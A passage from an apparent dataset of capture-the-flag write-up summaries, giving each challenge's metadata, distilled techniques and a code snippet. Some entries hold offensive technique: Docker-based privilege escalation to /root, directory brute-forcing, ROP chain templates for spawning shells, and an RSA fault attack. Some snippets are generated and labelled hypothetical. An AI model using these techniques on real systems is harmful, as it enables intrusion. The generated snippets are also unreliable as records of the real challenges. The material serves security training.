        "key": "```c\n#define NUM_SONGS 50\n\nstruct song{  \n   char song_path[24]; // 24 bytes  \n   int fd;             // 4 bytes with 4 bytes padding  \n   char* album;        // 8 bytes  \n   char* song;         // 8 bytes  \n   char* contents;     // 8 bytes  \n}; // 56 bytes\n\nint song_count;  \nstruct song songs[NUM_SONGS];  \n\nint nread = read(0, songs[song_count].song_path, sizeof(songs[song_count].song_path));  \nif(nread <= 0){  \n    printf(\"Error reading input, exiting\\n\");  \n    exit(-1);  \n}  \nif(songs[song_count].song_path[nread-1] == '\\n'){  \n    songs[song_count].song_path[nread-1] = '\\x00';  \n}\n\nsongs[song_count].fd = open(songs[song_count].song_path, O_RDONLY);  \nif(songs[song_count].fd == -1 || songs[song_count].song_path[0] < 'A' || songs[song_count].song_path[0] > 'Z' ||  \n    strstr(songs[song_count].song_path, \"flag\") || strstr(songs[song_count].song_path, \"..\")){  \n    printf(\"Error: Bad filepath, exiting\\n\");  \n    exit(-1);  \n}\n\nsongs[song_count].album = strtok(songs[song_count].song_path, \"/\");  \nsongs[song_count].song = strtok(NULL, \".\");  \n\nif (!songs[choice].contents){  \n    for(int i = 0; i < sizeof(length); i++){  \n        read(songs[choice].fd, length+i, 1);  \n        if(length[i] == '\\n'){  \n            length[i] = '\\x00';  \n            break;  \n        }  \n    }  \n    file_len = atoi(length);  \n    songs[choice].contents = malloc(file_len + 1);  \n    memset(songs[choice].contents, 0, file_len+1);  \n    read(songs[choice].fd, songs[choice].contents, file_len);  \n}\n\nprintf(\"Removing: %s from %s\\n\", songs[choice].song, songs[choice].album);  \nsongs[choice].song = 0;  \nsongs[choice].album = 0;  \nfree(songs[choice].contents);  \nsongs[choice].contents = 0;  \nmemset(songs[choice].song_path, 0, sizeof(songs[choice].song_path));  \nclose(songs[choice].fd);  \nsongs[choice].fd = 0;  \n```"
    },
    {
        "name": "Time Eater",
        "write_up": "dataset/raw/Time Eater.md",
        "type": "web",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 482,
        "max_score": 499,
        "difficulty": 0.9659318637274549,
        "knowledge": [
            "When faced with a scenario requiring directory and file enumeration on a web server where the usual points of interest provide little to no information, employing tools like Gobuster with a comprehensive wordlist can unveil hidden directories or files that may contain valuable information for progressing in a challenge. Such enumeration can disclose endpoints that are not directly linked or visible from the main application's interface. For example:\n   - **Gobuster command sample**: `gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://${IP} --timeout 30s`",
            "In challenges involving gaining higher privileges or accessing restricted files, if docker is present and the user has permissions to interact with docker, creating and running a docker container can be utilized to mount the host system's sensitive directories (like `/root`) inside the container. This approach can enable access to files that would otherwise be inaccessible due to permission restrictions. This technique is highly effective in environments where docker containers are configured to run as root or with elevated privileges.\n   - **Docker command sample for privilege escalation**: `docker run -v /root:/loot --rm -it alpine /bin/sh`, followed by navigating to the mounted directory to access restricted files."
        ],
        "key": "```c\n// Hypothetical vulnerable code snippet based on the context of Docker abuse\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main() {\n    // Vulnerable code: running a shell with elevated privileges\n    setuid(0); // Set user ID to root\n    system(\"/bin/sh\"); // Execute shell\n    return 0;\n}\n```"
    },
    {
        "name": "Tiny EasterEgg",
        "write_up": "dataset/raw/Tiny EasterEgg.md",
        "type": "misc",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": 50,
        "max_score": 400,
        "difficulty": 0.125,
        "knowledge": [
            "When dealing with DNA or genetic sequence data within a CTF challenge, a custom script can be utilized to decode the sequence into readable information, such as a flag. Firstly, the script can map each group of DNA bases (ATGC) to hexadecimal characters to represent bytes of data. A DNA sequence without common characters in groups of four (e.g., ATGC) can signify a unique mapping to hexadecimal values, which are then converted into ASCII characters revealing the flag or secret message. This approach requires iterating through the DNA sequence, converting each quartet of bases into its respective byte, and ultimately translating the byte array into a string or file for analysis.",
            "In scenarios that involve complex data encoding as seen with genetic sequences, it's essential to carefully select and iterate through all possible patterns or permutations that meet a specific criteria\u2014such as each character in the pattern being unique. Utilizing nested loops in a script allows for the generation of these patterns systematically. Each generated pattern can then be tested against the dataset, in this case, the DNA sequence, to attempt decoding based on predefined rules (mapping bases to bits, then to bytes, and finally to ASCII characters). Creating a broad search strategy across different patterns enhances the chance of successfully decoding the concealed information.\n   \n   Sample decoding approach (simplified for practical application):\n   \n   ```python\n   def decode_dna_to_bytes(dna_sequence):\n       mapping = {'A': 0, 'T': 1, 'G': 2, 'C': 3} # Example base to binary mapping\n       bytes_array = []\n       for i in range(0, len(dna_sequence), 4): # Process each quartet\n           quartet = dna_sequence[i:i+4]\n           byte = 0\n           for j in range(4):\n               byte |= mapping[quartet[j]] << (6 - 2*j)\n           bytes_array.append(byte)\n       return bytes(bytes_array)\n   ```"
        ],
        "key": "```python\ndef hex_dna(dna):  \n\tpats = []  \n\tfor ch1 in 'ATGC':  \n\t\tfor ch2 in 'ATGC':  \n\t\t\tif ch1 == ch2:  \n\t\t\t\tcontinue  \n\t\t\tfor ch3 in 'ATGC':  \n\t\t\t\tif ch1 == ch3 or ch2 == ch3:  \n\t\t\t\t\tcontinue  \n\t\t\t\tfor ch4 in 'ATGC':  \n\t\t\t\t\tif ch1 == ch4 or ch2 == ch4 or ch3 == ch4:  \n\t\t\t\t\t\tcontinue  \n\t\t\t\t\tpats.append(ch1+ch2+ch3+ch4)  \n\tprint(pats)\n\n\tdna = ''.join(dna.strip().split())  \n\tfor pat in pats:  \n\t\tarr = []  \n\t\tfor i in range(0,len(dna),4):  \n\t\t\tx1 = pat.index(dna[i])  \n\t\t\tx2 = pat.index(dna[i+1])  \n\t\t\tx3 = pat.index(dna[i+2])  \n\t\t\tx4 = pat.index(dna[i+3])  \n\t\t\tx = (x1<<6)|(x2<<4)|(x3<<2)|x4  \n\t\t\tarr.append(x)  \n\t\tbuf = bytes(arr)  \n\t\twith open('tiny/dna_%s.txt'%pat,'wb') as f:  \n\t\t\tf.write(buf)  \n\t\t\tf.close()  \n\t\tprint(pat, buf)\n```"
    },
    {
        "name": "Tiny ECC",
        "write_up": "dataset/raw/Tiny ECC.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 217,
        "max_score": 477,
        "difficulty": 0.4549266247379455,
        "knowledge": [
            "When selecting a prime number for elliptic curve cryptography, ensure that the chosen prime number `p` satisfies specific properties: it must be prime, have a bit length equal to a predetermined value (for example, 128 bits), and `2*p + 1` must also be prime. These conditions are crucial for setting up the elliptic curve parameters correctly, especially when the curve is used in cryptographic challenges or systems.",
            "In elliptic curve challenges, particularly when solving the discrete logarithm problem, it's possible to simplify the challenge by forging the elliptic curve to a more manageable form. Specifically, altering the curve to `y^2 = x^3` simplifies solving the discrete logarithm problem. This can be accomplished by setting the curve's parameters `(a, b)` to `(0,0)` modulo `p`. However, if direct zero values are not permitted, one can use equivalent values that are congruent to `0` modulo `p`, such as `(a, b) = (p*(2*p+1), p*(2*p+1))` for the given prime `p`. This strategy leads to the creation of a singular curve, for which the discrete logarithm problem simplifies to a division operation in the corresponding modular field."
        ],
        "key": "```python\ndef is_valid_prime(p, nbit):\n    return isPrime(p) and p.bit_length() == nbit and isPrime(2*p + 1)\n\ndef is_valid_parameters(a, b):\n    return a * b != 0\n\n# Example of vulnerable parameter selection\np = 2**127 - 1  # Example of a 128-bit prime\na = p * (2*p + 1)\nb = p * (2*p + 1)\n\nif is_valid_prime(p, 128) and is_valid_parameters(a, b):\n    # Vulnerable curve: y^2 = x^3\n    print(\"Vulnerable curve parameters selected.\")\n```"
    },
    {
        "name": "Tiny Tim",
        "write_up": "dataset/raw/Tiny Tim.md",
        "type": "pwn",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 123,
        "max_score": 500,
        "difficulty": 0.246,
        "knowledge": [
            "For x86_64 binaries with no stack canaries, NX disabled, and control over `rip` through a buffer overflow, executing a Return-Oriented Programming (ROP) chain is a viable method to achieve arbitrary code execution. In this scenario, gadgets can be used to manipulate registers for syscalls, allowing for operations like mprotect to modify memory permissions to executable, or syscalls like execve to spawn a shell. This approach is pivotal when direct execution of shellcode on the stack is not feasible due to security mitigations like NX. To execute syscalls via ROP, the following registers must be set according to the x86_64 calling conventions: rax (syscall number), rdi (first argument), rsi (second argument), and rdx (third argument). Sample gadget usage for `mprotect(0x400000, 0x1000, 7)` syscall setup:\n   ```\n   rop.raw(pop_rdi)\n   rop.raw(0x400000)  # Address to change permissions\n   rop.raw(pop_rsi)\n   rop.raw(0x1000)    # Size of the memory\n   rop.raw(pop_rdx)\n   rop.raw(7)         # rwx permissions\n   rop.raw(pop_rax)\n   rop.raw(10)        # Syscall number for mprotect\n   rop.raw(syscall)   # triggering syscall\n   ```",
            "When NX is disabled but direct injection and execution of shellcode is not possible due to other constraints (e.g., lack of executable memory regions), changing memory page permissions via ROP to execute shellcode is an effective method. This technique requires knowledge of syscalls for memory protection changes, specifically `mprotect`, and syscalls for reading or writing memory, like `read` or `write`. Additionally, finding or crafting a memory region (usually within the binary's segments) to inject and execute shellcode is crucial. A typical ROP chain might first change a page's permissions to executable (using mprotect), then read or write shellcode into that page, and finally, jump to the shellcode to gain a shell. The payload's structure usually consists of a padding to overwrite the return address followed by the ROP chain addresses and, if needed, the shellcode:\n   ```\n   padding = b'A' * overflow_offset\n   rop_chain = [\n       pop_rdi, 0x0,        # Argument for stdin (0)\n       pop_rsi, page_address,   # Target address to write shellcode\n       pop_rdx, shellcode_length,  # Length of shellcode\n       pop_rax, syscall_number_for_read,  # Syscall read\n       syscall,  # Trigger read to write shellcode into executable page\n       page_address  # Jump to shellcode\n   ]\n   payload = padding + b''.join(rop_chain)\n   ```"
        ],
        "key": "```assembly\n0000000000401008 <vuln>:  \n 401008:       55                      push   rbp  \n 401009:       48 89 e5                mov    rbp,rsp  \n 40100c:       48 83 ec 20             sub    rsp,0x20  \n 401010:       48 89 e6                mov    rsi,rsp  \n 401013:       48 31 c0                xor    rax,rax  \n 401016:       48 31 ff                xor    rdi,rdi  \n 401019:       ba 00 02 00 00          mov    edx,0x200  \n 40101e:       0f 05                   syscall  \n 401020:       b8 00 00 00 00          mov    eax,0x0  \n 401025:       48 83 c4 20             add    rsp,0x20  \n 401029:       5d                      pop    rbp  \n 40102a:       c3                      ret  \n```"
    },
    {
        "name": "Titanic",
        "write_up": "dataset/raw/Titanic.md",
        "type": "This write-up corresponds to a PPC (cryptography) challenge.",
        "competition": [
            "ASIS/2020/Quals",
            "https://ctftime.org/event/964/tasks/"
        ],
        "score": 125,
        "max_score": 375,
        "difficulty": 0.3333333333333333,
        "knowledge": [
            "When dealing with challenges requiring the modification of a number to meet certain conditions, such as converting to a printable ASCII string, one strategy is to manipulate the least significant bytes based on the observation that altering higher-value bytes to lower or increase the overall number can lead to optimal solutions. In scenarios where only ASCII printable characters are considered valid, the lower bound can be represented by `0x09` (Tab character in ASCII) and the upper bound by `0x7e` (Tilde character in ASCII). These bounds are utilized to ensure that any adjustments made to the number result in a string of printable characters, facilitating a binary search-like approach in finding the nearest number that meets the challenge criteria.",
            "For challenges involving hashing, especially with constraints like utilizing words from a source (e.g., movie subtitles or scripts) and wrapping them with a prefix and suffix before hashing (MD5, in the scenario), an approach involves systematically iterating through each word, applying necessary transformations such as converting to lowercase, removing punctuation, or handling special cases like contracted words, and then hashing the transformed word to check against a given hash. This brute-force method is particularly effective when the hash algorithm is not resistant to pre-image attacks, and the dataset (list of words) is of manageable size. Employing regular expressions (regex) can enhance the cleaning/processing step by offering a more flexible way to strip unwanted characters from words before hashing.\n\nExample Payload for Point 1: Unable to provide a specific payload as it varies per task, but the idea involves adjusting the hex representation of a number, ensuring all bytes beyond a significant byte adhere to the `0x09` or `0x7e` bounds.\n\nExample Payload for Point 2:\n`if hashed == '9326ea0931baf5786cde7f280f965ebb': print('[*] Hash found!')`"
        ],
        "key": "```python  \ndef reference_solver(number):  \n   v = number  \n   while True:  \n       if is_printable(long_to_bytes(v)):  \n           high = v  \n           break  \n       else:  \n           v += 1  \n   v = number  \n   while True:  \n       if is_printable(long_to_bytes(v)):  \n           low = v  \n           break  \n       else:  \n           v -= 1  \n   if abs(low - number) < abs(high - number):  \n       return low  \n   else:  \n       return high  \n```\n\n```python  \ndef solve(number):  \n   hexes = clean_hex(number).replace(\"0x\", \"\").replace(\"L\", \"\")  \n   if len(hexes) % 2 == 1:  \n       hexes = '0' + hexes  \n   chunks = chunk(hexes, 2)  \n   res = ''  \n   lowest = '09'  \n   highest = '7e'  \n   for i in range(len(chunks) - 1):  \n       c = \"\".join(chunks[i:i + 2])  \n       if c != hexmapping[c]:  \n           missing = len(chunks) - i - 2  \n           res += hexmapping[c]  \n           if int(c, 16) < int(hexmapping[c], 16):  \n               res += (lowest * missing)  \n           else:  \n               res += (highest * missing)  \n           break  \n       else:  \n           res += chunks[i]  \n   if len(res) / 2 < len(chunks):  \n       res += mapping_small[chunks[-1]]  \n   return int(res, 16)  \n```"
    },
    {
        "name": "Titu",
        "write_up": "dataset/raw/Titu.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 69,
        "max_score": 477,
        "difficulty": 0.14465408805031446,
        "knowledge": [
            "When solving cryptographic challenges that involve equations, if variables are intertwined in a complex equation and there's a big constant involved, try factoring the constant. This can significantly simplify the problem if the constant or a related term can be expressed as a product of smaller factors or even better, as a perfect square. This approach is particularly useful when the equation can be manipulated into a more recognizable or solvable form after understanding the structure of the constant.",
            "In challenges where the goal is to find specific values (such as a flag) that satisfy a given equation, and the equation can be transformed into a form involving perfect squares, consider using divisors of the square root of a key constant. This method involves identifying factors of a derived number (in this case, $4k$, where $k$ is a key constant) and systematically checking each divisor or a combination of divisors to find the solution. This is most useful when the equation can be factored into a form where the solutions can be directly related to the divisors of a key constant.\n\nExample of using `divisors(m)` function in Sage for such a scenario:\n\n```python\nm = prod([2, 2, 3, 11, 11, 19, 47, 71, 3449, 11953, 5485619, 2035395403834744453, 17258104558019725087, 1357459302115148222329561139218955500171643099])  # Derived from factoring a constant \nfor d in divisors(m):  \n   x = long_to_bytes(d - 1)  \n   if b'CCTF{' in x:  \n       print(x)    \n       y = (m // d) + 1   \n       print(long_to_bytes(y))\n```\n\nThis snippet is especially useful in contexts where a cryptographic challenge provides a complex equation with a solution tied to the properties of certain numbers derived from the problem statement."
        ],
        "key": "```python  \n#!/usr/bin/env python3\n\nfrom Crypto.Util.number import *  \nfrom flag import flag\n\nl = len(flag)  \nm_1, m_2 = flag[: l // 2], flag[l // 2:]\n\nx, y = bytes_to_long(m_1), bytes_to_long(m_2)\n\nk = '''  \n000bfdc32162934ad6a054b4b3db8578674e27a165113f8ed018cbe9112  \n4fbd63144ab6923d107eee2bc0712fcbdb50d96fdf04dd1ba1b69cb1efe  \n71af7ca08ddc7cc2d3dfb9080ae56861d952e8d5ec0ba0d3dfdf2d12764  \n'''.replace('\\n', '')\n\nassert((x**2 + 1)*(y**2 + 1) - 2*(x - y)*(x*y - 1) == 4*(int(k, 16) + x*y))  \n```"
    },
    {
        "name": "Toast-clicker3",
        "write_up": "dataset/raw/Toast-clicker3.md",
        "type": "This write-up describes a Reverse challenge.",
        "competition": [
            "BSidesSF/2020",
            "https://ctftime.org/event/977/tasks/"
        ],
        "score": 96,
        "max_score": 493,
        "difficulty": 0.1947261663286004,
        "knowledge": [
            "When dealing with dynamic class loading in Android applications, specifically using `DexClassLoader`, it is important to retrieve and decompile the referenced DEX (Dalvik Executable) files to understand the functionality of dynamically loaded classes. This includes identifying methods and parameters that can be invoked to achieve a desired outcome, such as extracting flags in a CTF challenge. This knowledge is applicable in scenarios requiring the analysis of Android applications that leverage dynamic code loading as a mechanism to execute code stored outside the main application APK.",
            "In instances where an application downloads external resources or files, the URLs embedded within the application's code can be a direct source for obtaining these files. Extracting and analyzing the content of such files can be critical for understanding the application's behavior, reverse-engineering, or in a CTF context, solving challenges. This approach is universally applicable for scenarios where applications dynamically fetch and execute code or store external resources that are pivotal for the application's or challenge's completion."
        ],
        "key": "```java\npublic void loadClass() {  \n    String methodToInvoke = \"printThirdFlag\";  \n    try {  \n        Class loadedClass = new DexClassLoader(Uri.fromFile(new File(getExternalFilesDir(null), \"bacon-final.dex\")).toString(), null, null, ClassLoader.getSystemClassLoader().getParent()).loadClass(\"bacon.ToastDynamicFlag\");  \n        Object obj = loadedClass.newInstance();  \n        String str = (String) loadedClass.getMethod(methodToInvoke, new Class[]{String.class, String.class}).invoke(obj, new Object[]{\"ijiijiiijjjjjijijijiiijjijjjji\", \"jjjiiiiijjjijijijjijiijji\"});  \n    } catch (ClassNotFoundException e) {  \n        e.printStackTrace();  \n    } catch (InstantiationException e2) {  \n        e2.printStackTrace();  \n    } catch (IllegalAccessException e3) {  \n        e3.printStackTrace();  \n    } catch (NoSuchMethodException e4) {  \n        e4.printStackTrace();  \n    } catch (IllegalArgumentException e5) {  \n        e5.printStackTrace();  \n    } catch (InvocationTargetException e6) {  \n        e6.printStackTrace();  \n    }  \n}  \n```"
    },
    {
        "name": "token of hxp",
        "write_up": "dataset/raw/token of hxp.md",
        "type": "crypto",
        "competition": [
            "C3CTF/2019",
            "https://ctftime.org/event/825/tasks/"
        ],
        "score": 714,
        "max_score": 1000,
        "difficulty": 0.714,
        "knowledge": [
            "When dealing with USB device firmware in CTF challenges, pay attention to the setup of vendor-specific control requests (`bRequest` values) sent to the device. These requests can often be a key to understanding device-specific commands or actions, such as writing data to EEPROM or triggering certain functionalities. For example, in the context of HID devices, specific `bRequest` values might correspond to different types of data that the device expects, like a password or a nonce, or could even trigger an action like generating a token.",
            "If the firmware involves cryptographic operations such as HMAC-SHA1 for token generation, and details about the key and message are unclear, it may be beneficial to inspect the USB interaction closely, especially looking for requests that are not documented or captured in provided traffic, such as a missing `0xdd` request in this case. Understanding the handling of these requests can reveal essential aspects of the cryptographic process, like the composition of the key (potentially combining pieces of information found in EEPROM) and the message that triggers token generation.\n\nThese insights can be universally applicable to similar challenges involving USB device interactions and cryptographic processes within firmware analysis tasks."
        ],
        "key": "```c\nbyte * usbFunctionSetup(byte *param_1)\n{  \n undefined *puVar1;  \n  \n Z = param_1;  \n W._0_1_ = *param_1;  \n W._1_1_ = (byte)((uint)param_1 >> 8);  \n W._0_1_ = (byte)W & 0x60;  \n if ((byte)W == 0x20) {  \n   [...]  \n   // USB specific functions being handled here  \n   [...]  \n }  \n else {  \n   if ((byte)W == 0x40) {  \n     W._0_1_ = param_1[1];  \n     if ((byte)W == 0xbb) {  \n       write_volatile_1(usbMsgLen,R1);  \n       W._0_1_ = 3;  \n     }  \n     else {  \n       if ((byte)W == 0xdd) {  \n         write_volatile_1(usbMsgLen,R1);  \n         W._0_1_ = 4;  \n       }  \n       else {  \n         if ((byte)W != 0xaa) goto LAB_code_0005f6;  \n         write_volatile_1(usbMsgLen,R1);  \n         W._0_1_ = 2;  \n       }  \n     }  \nLAB_code_0005f2:  \n     write_volatile_1(vendorRequestType,(byte)W);  \n     param_1 = (byte *)CONCAT11(W._1_1_,0xff);  \n     return param_1;  \n   }  \n }  \nLAB_code_0005f6:  \n param_1 = (byte *)((uint)W._1_1_ << 8);  \n return param_1;  \n}\n```"
    },
    {
        "name": "Tokyo",
        "write_up": "dataset/raw/Tokyo.md",
        "type": "The type of challenge for this write-up is **forensics**.",
        "competition": [
            "ASIS/2018/Quals",
            "https://ctftime.org/event/568/tasks/"
        ],
        "score": 260,
        "max_score": 500,
        "difficulty": 0.52,
        "knowledge": [
            "When dealing with unrecognized binary file formats, headers, and repetitive patterns could suggest a real-life file or database format. Investigation might involve matching characteristics (like headers starting with specific characters, the presence of repeated value patterns, or unusual file structures) against known formats or even searching for hints related to real-life software or systems (as hinted by \"Kyoto Cabinet\" in the challenge). This approach could lead to identifying the file type when conventional tools such as `file` or `binwalk` fail to recognize the format. This strategy is particularly effective when a CTF challenge simulates a real-world scenario involving obscure or less commonly used file types.",
            "In challenges involved with sorting or reorganizing data, where data appears unordered or nonsensical, there may be hidden relationships between different parts of a file. For instance, if a file contains sections with seemingly unrelated numeric values and sections with data elements (like characters), the numeric values could serve as references or keys determining the order of data elements. This is especially true in challenges mimicking database structures like key/value stores. Techniques to uncover these relationships might include analyzing value patterns, attempting to match data elements with their references, or manipulating the file using tools specific to the suspected format (such as `kchashmgr` for a Kyoto Cabinet database). The recovery of order or meaningful structure in the data could require extracting and correctly interpreting these key-value pairs, potentially involving brute force or educated guessing to reconstruct keys that have been deliberately obscured or removed.\n\nExample Payload to Sort Data:\n```bash\n$ kchashmgr set database_file key \"value\"\n```\nThis command example, when adjusted to the correct key and value based on the challenge's context, could be used to manipulate the data within the file based on understood or discovered key/value mechanics, facilitating the reorganization or sorting of data to extract hidden information or flags."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\n#define MAX_KEY_LENGTH 3\n#define MAX_VALUE_LENGTH 1\n\ntypedef struct {\n    char key[MAX_KEY_LENGTH];\n    char value[MAX_VALUE_LENGTH];\n} Entry;\n\nEntry database[89];\n\nvoid insert_entry(const char *key, const char *value) {\n    for (int i = 0; i < 89; i++) {\n        if (strncmp(database[i].key, \"\\0\\0\\0\", MAX_KEY_LENGTH) == 0) {\n            strncpy(database[i].key, key, MAX_KEY_LENGTH);\n            strncpy(database[i].value, value, MAX_VALUE_LENGTH);\n            break;\n        }\n    }\n}\n\nvoid initialize_database() {\n    for (int i = 0; i < 89; i++) {\n        strncpy(database[i].key, \"\\0\\0\\0\", MAX_KEY_LENGTH);\n        strncpy(database[i].value, \"\\0\", MAX_VALUE_LENGTH);\n    }\n}\n\nint main() {\n    initialize_database();\n    insert_entry(\"000\", \"A\");\n    // Additional entries would be inserted here\n    return 0;\n}\n```"
    },
    {
        "name": "Too low voltage",
        "write_up": "dataset/raw/Too low voltage.md",
        "type": "The type of challenge described in the write-up is a crypto challenge.",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 435,
        "max_score": 500,
        "difficulty": 0.87,
        "knowledge": [
            "When facing RSA challenges, specifically regarding RSA-CRT (Chinese Remainder Theorem) vulnerabilities, exploit conditions such as a server running under undervolted conditions to induce faults in signature generation. This scenario is ripe for fault attacks such as the Bellcore attack, where one can obtain both a valid and an invalid signature for the same message to factor the RSA modulus `N`. The process requires computing the Greatest Common Divisor (GCD) of the difference between the valid (`s`) and invalid (`s'`) signatures and `N`. If `GCD(s-s', N)` results in a value other than 1 or `N`, this value is one of the prime factors of `N`, which can lead to the discovery of the private key `d` by computing the modular inverse of `e` with respect to `\\(\\phi(N)\\)` where `\\(\\phi(N)\\)` is Euler's totient function of `N`.",
            "Implementing fault attacks in scenarios with controlled inputs (like signing a fixed message) can successfully expose vulnerabilities in cryptographic systems. Specifically, the process involves repeatedly requesting the server to sign a predetermined message, checking each signature against the public key for validity, and utilizing the moment a discrepancy is observed to apply the fault attack technique. The successful application of this method depends on distinguishing between normal and fault-induced output behavior, a distinction often enabled by external conditions such as power issues hinted at by the challenge scenario. \n\n**Note:** Since the knowledge extraction demands applicability across various scenarios without specific payloads or scripts, the above points encapsulate the core concepts without delving into script-specific details."
        ],
        "key": "```python\ndef bellcore(sig, sig_p, e, N):  \n   p = gcd(sig-sig_p, N)  \n   if p == 1 or p == N:  \n       return None  \n   q = N // p  \n   phi = (p-1) * (q-1)  \n   return inverse_mod(e, phi)\n```"
    },
    {
        "name": "Too Much",
        "write_up": "dataset/raw/Too Much.md",
        "type": "misc",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 484,
        "max_score": 500,
        "difficulty": 0.968,
        "knowledge": [
            "When faced with the challenge of processing a large number of numbers to find distinct pairs that sum up to another given number without provided implementation, an efficient approach is to:\n   - Ignore numbers greater than the input `x` to reduce the pool for finding pairs.\n   - For each eligible number, compute `x - num` and store the result.\n   - Find the intersection of this resultant list with the original list, which represents potential pairs.\n   - The final result is the length of this intersection divided by 2, considering each pair is counted twice (once as `(y, z)` and once as `(z, y)`).",
            "For challenges involving multiple conditional branches and requiring to find an input that reaches a specific branch, employing symbolic execution frameworks like angr can automate the process of finding the correct input. Key steps include:\n   - Initialize the symbolic execution with constraints on the input to ensure it only considers printable characters.\n   - Set up the desired and wrong addresses based on the challenge's binary to guide the symbolic execution towards the correct path.\n   - Run the simulation until it either reaches the desired address (indicating success) or the wrong address (failure), and extract the successful input as the flag.\n\n   Sample angr exploitation snippet:\n   ```python\n   import angr, claripy\n   target = angr.Project('binary_file', auto_load_libs=False)\n   inp = [claripy.BVS(f'byte_{i}', 8) for i in range(input_length)]  # Defining symbolic bytes\n   flag = claripy.Concat(*inp + [claripy.BVV(b'\\n')])  # Concatenating to form a symbolic flag\n   \n   st = target.factory.full_init_state(args=[\"./binary_file\"], stdin=flag)\n   for byte in inp:\n       st.solver.add(byte < 0x7f, byte > 0x20)  # Constrain to printable ASCII\n\n   sm = target.factory.simulation_manager(st)\n   sm.explore(find=desired_address, avoid=wrong_address)  # Directs the exploration\n\n   if sm.found:\n       valid_input = sm.found[0].posix.dumps(0)  # Extracting the valid input if found\n       print(valid_input.decode())\n   ```"
        ],
        "key": "```python\ndef func(x):  \n   # Returns the number of distinct pairs (y, z) from the numbers in the file\n\"numbers.txt\" whose y != z and (y + z) == x  \n   # Note that two pairs (y, z) and (z, y) are considered the same and are\ncounted only once\n\n   numbers = open('numbers.txt', 'r').readlines()  \n   numbers = set(numbers)  \n  \n   results = []  \n   for num in numbers:\n\n       num = int(num.rstrip(\"\\n\"))  \n       if x < num:  \n           continue\n\n       tmp = x - num  \n       results.append(str(tmp)+\"\\n\")\n\n   new_list = intersection(results, numbers)\n\n   print(f\"{len(new_list)//2} : {chr(len(new_list)//2)}\")\n\n   return(len(new_list)//2)\n```"
    },
    {
        "name": "Too Secure",
        "write_up": "dataset/raw/Too Secure.md",
        "type": "crypto",
        "competition": [
            "CyBRICS/2020",
            "https://ctftime.org/event/1012/tasks/"
        ],
        "score": 237,
        "max_score": 500,
        "difficulty": 0.474,
        "knowledge": [
            "In cryptographic challenges involving commitment schemes, if you need to create a different pair of `selection, random` (i.e., `x, r`) that leads to the same commitment value, one approach is to leverage operations modulo a prime factor of `p-1` (where `p` is part of the scheme parameters) or modulo `p-1` itself. This exploitation is possible because \\(g^{x + a'\\cdot r} \\mod p\\) can be simplified by Euler's theorem if the exponent is taken modulo `p-1` or any of its prime factors. Thus, this allows for the calculation of a new `random` value that, combined with a new selection, produces the original commitment. \n\n    - Condition: This technique is applicable in scenarios where committing to a value involves operations of the form \\(g^x \\mod p\\) and revealing involves showing `x` and `r` such that the commitment can be verified without directly revealing `x`. It also requires \\(gcd(a', p-1) != 1\\) where `a'` can be a derivation from the scheme's calculations.",
            "When the greatest common divisor (gcd) between an element (`a_dash2` in the context) and `p-1` is not equal to 1, making the modular inverse computation infeasible directly within the modulo `p-1` space, the solution is to identify a large prime factor of `p-1` and perform operations in modulo this prime factor's space instead. This is effective because the modular inverse exists in the space of this prime factor, allowing for the manipulation of equations to solve for variables of interest, such as finding an alternative `r` value that satisfies the commitment equation. \n\n    - Payload sample: `r2 = ((x1 - x2 + a1 * r1) * gmpy2.invert(a2, q) % q)` where `x1`, `x2` are selections, `a1`, `a2` derived values from those selections, `r1` is the original random value, and `r2` is the new random value to be computed that, along with `x2`, forms a new valid pair producing the same commitment."
        ],
        "key": "```python  \nimport hashlib  \nfrom crypto_commons.generic import long_to_bytes, bytes_to_long\n\ndef bytes_to_long_le(S):  \n   return sum([ord(S[i]) * 2 ** (8 * i) for i in range(len(S))])  \n  \ndef calculate(g, p, m):  \n   x = bytes_to_long_le(m)  \n   G = pow(g, x, p)  \n   Gprim = long_to_bytes(G)  \n   Gprim = '\\0' * (128 - len(Gprim)) + Gprim  \n   a = hashlib.sha512(Gprim).digest()  \n   a_prim = bytes_to_long(a)  \n   a_dash = pow(a_prim, a_prim, p - 1)  \n   h = pow(g, a_dash, p)  \n   return G, h, a_dash  \n  \np = 12039102490128509125925019010000012423515617235219127649182470182570195018265927223  \ng = 10729072579307052184848302322451332192456229619044181105063011741516558110216720725  \nr1 = 31245182471  \nM1 = 'Hi! I am Vadim Davydov from ITMO University'  \nG1, h1, a1 = calculate(g, p, M1)  \nprint(G1 * pow(h1, r1, p) % p)  \n```"
    },
    {
        "name": "tooooo",
        "write_up": "dataset/raw/tooooo.md",
        "type": "pwn",
        "competition": [
            "HITCON/2018",
            "https://ctftime.org/event/669/tasks/"
        ],
        "score": 310,
        "max_score": 500,
        "difficulty": 0.62,
        "knowledge": [
            "In ARM-based (aarch64) pwnable challenges, if you need to execute `/bin/sh` but direct exploitation methods like `one_gadget` fail due to corrupted registers or stack data, consider using a two-step pointer overwrite strategy. First, set the `x0` register to point to `/bin/sh` using a function like `getusershell()` which retrieves valid user shell paths. This method is specifically useful in scenarios where the stack or registers are not in a state suitable for immediate exploitation with `one_gadget`.",
